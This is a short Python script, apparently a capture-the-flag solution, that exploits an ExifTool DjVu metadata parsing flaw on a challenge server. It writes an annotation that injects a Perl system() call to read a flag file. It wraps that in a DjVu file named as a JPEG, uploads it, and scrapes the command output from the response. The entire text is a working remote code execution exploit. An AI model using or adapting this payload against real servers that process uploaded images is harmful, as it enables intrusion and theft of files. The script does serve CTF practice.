import requests
import subprocess
import re

url = "http://chall.0xfun.org:5804/"

cmd = '''(metadata "\\c${system('cat ../flag.txt')};")'''

with open("payload.txt", 'w') as f:
    f.write(cmd)

subprocess.run(['djvumake', 'payload.jpg', 'INFO=1,1', 'BGjp=/dev/null', 'ANTa=payload.txt'], capture_output=True)
print("> Payload created")

with open('payload.jpg', 'rb') as f:
    res = requests.post(url, files={
        'file': ('payload.jpg', f.read(), 'image/jpeg')
    })

leak = re.findall(r'<pre>(.+)Exif', res.text.replace('\n', ' '))[0].strip()
print("Flag:", leak)